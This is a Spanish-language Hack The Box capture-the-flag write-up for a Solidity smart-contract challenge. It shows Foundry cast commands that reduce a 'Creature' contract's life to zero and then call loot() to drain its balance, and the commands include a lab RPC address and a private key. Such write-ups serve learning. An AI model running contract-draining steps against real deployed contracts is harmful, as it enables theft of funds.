# htb-survival-of-the-fittest🦖
Hack The Box/Blockchain Challenge — Explotación de Smart Contract (Solidity)

Antes de comenzar el reto, fue necesario instalar Foundry, un framework de desarrollo para smart contracts en Solidity que permite interactuar con contratos ya desplegados. Puedes encontrarlo en su documentación oficial, o accediendo a: 

https://getfoundry.sh/
![Captura de pantalla 2025-06-22 154708](https://github.com/user-attachments/assets/62831ee1-bc54-43f9-aaa9-345dbb410ff8) <br><br>

El entorno de este reto corre en una red privada con RPC personalizado (RPC es la interfaz que nos permite interactuar con nodos de la blockchain remotamente).
Cada vez que reinicias el challenge, se te asigna una IP y puerto únicos, visibles en la sección "Connection" de la web del challenge. <br><br>

![Captura de pantalla 2025-06-22 154537](https://github.com/user-attachments/assets/87efd4bf-69dd-4114-b042-0da98e93f87c)
![Captura de pantalla 2025-06-22 160606](https://github.com/user-attachments/assets/bcb05e3e-7c58-410c-bc36-b1bb2cc3ccbe)


⚠️ La IP y el puerto que aparecen aquí son distintos a los tuyos. Asegúrate de copiar los datos actuales desde tu instancia en HTB.

~ Contratos proporcionados ~

![Captura de pantalla 2025-06-22 163301](https://github.com/user-attachments/assets/91f406ce-8298-4d87-ab69-2d4e94272159)

-Setup.sol
Este contrato crea una instancia de Creature.
Tiene una función isSolved() que devuelve true si Creature tiene balance == 0.

```
function isSolved() public view returns (bool) {
    return address(TARGET).balance == 0;
}
```

-Creature.sol
Este es el contrato principal del reto. Tiene una vida (lifePoints) inicial de 20. Permite atacarlo, y si su vida llega a 0, se puede llamar loot() para vaciar su balance.
```
isSolved(): Devuelve true si el contrato Creature ya no tiene saldo y nuestro ataque fue exitoso.
```
Conclusión: El reto consiste en interactuar con un contrato llamado Creature, que comienza con 20 puntos de vida (lifePoints) y contiene una función loot() que permite retirar su balance únicamente cuando sus puntos de vida llegan a cero. El objetivo es reducir 
su vida a 0 y vaciar su balance (inicialmente con 10 wei), de modo que la función isSolved() del contrato Setup retorne true.

![Captura de pantalla 2025-06-22 165903](https://github.com/user-attachments/assets/fdea670d-b208-486d-b12a-8d111ecadc63)
Estoy usando cast send para enviar una transacción.

```
cast send \
  --rpc-url http://94.237.48.12:43003/rpc \
  --private-key 0xbafd5876d4a4ac29bff3db7837c86f996c9322bacd734e0d242aaca015053a35 \
  0x844e738D927Ae2F465fC69C69eD9A7EC1E0a3C4f \
  "strongAttack(uint256)" 20
```
1. --rpc-url: Dirección RPC del nodo donde se corre el reto
2. --private-key: Clave privada de tu wallet
3. Dirección del contrato: Donde se envía la transacción (Creature o Setup)
4. "strongAttack(uint256)" 20: Llama a strongAttack con 20 de daño para dejar al Creature con 0 vida.
strongAttack(20) es una función del contrato Creature que reduce sus lifePoints en 20.

Como empieza con 20, al hacer esto queda con 0 vida.

Al ejecutarlo, se guarda en el estado del contrato que la Creature está "muerto".

![Captura de pantalla 2025-06-22 170020](https://github.com/user-attachments/assets/e8819347-66e2-4072-9d11-be34fbe9a201)
```
cast send \
  --rpc-url http://94.237.48.12:43003/rpc \
  --private-key 0xbafd5876d4a4ac29bff3db7837c86f996c9322bacd734e0d242aaca015053a35 \
  0x844e738D927Ae2F465fC69C69eD9A7EC1E0a3C4f \
  "loot()"
```
1. "loot()"	Reclama el balance del contrato si su vida es 0

loot() está protegida por un require(lifePoints == 0) ~ solo puede llamarse si mataste al Creature.

Como ya lo hice, la función transfiere todo el balance del contrato (10 wei) a mi wallet.

![Captura de pantalla 2025-06-22 170152](https://github.com/user-attachments/assets/cc11db3f-39d8-49dc-842e-823d2fdde5f9)
```
cast call \
  --rpc-url http://94.237.48.12:43003/rpc \
  0x1e5B512Fe445d623446E7c5B114f4f4142c59AB3 \
  "isSolved()"
  ```
 
Uso cast call (llamada de solo lectura) para consultar si el reto fue resuelto.
El contrato Setup tiene una función isSolved() que devuelve true cuando el Creature tiene balance == 0.

Como hice loot(), el contrato se quedó sin fondos, por lo tanto, devuelve 1 (que significa true).
Así que... ¡felicidades! El reto ya está resuelto. GGs!

~ Dirigete hacía la URL y escribe /flag 

![Captura de pantalla 2025-06-22 171522](https://github.com/user-attachments/assets/5df6324d-72da-48f2-bbe9-ba6550cb9000)

![Captura de pantalla 2025-06-22 154442](https://github.com/user-attachments/assets/56b73028-33c1-41d4-84ae-9f9252ca68ed)




